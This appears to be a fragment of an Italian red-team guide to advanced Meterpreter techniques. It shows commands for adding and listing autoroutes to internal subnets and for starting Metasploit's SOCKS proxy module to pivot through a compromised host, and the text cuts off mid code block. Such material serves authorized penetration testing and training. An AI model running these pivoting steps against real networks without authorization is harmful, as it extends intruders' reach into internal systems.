
## 📄 FILE 4: docs/advanced-techniques.md

```markdown
# ⚡ Tecniche Meterpreter Avanzate per Red Team

## 🔄 Movimento Laterale e Pivoting

### Autorouting e Pivoting
```bash
# Aggiungere route per subnet interne
meterpreter > run autoroute -s 192.168.100.0/24
meterpreter > run autoroute -s 10.0.0.0/8

# Visualizzare route attive
meterpreter > run autoroute -p

# Configurare SOCKS proxy per pivoting
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(socks_proxy) > set VERSION 4a
msf6 auxiliary(socks_proxy) > run
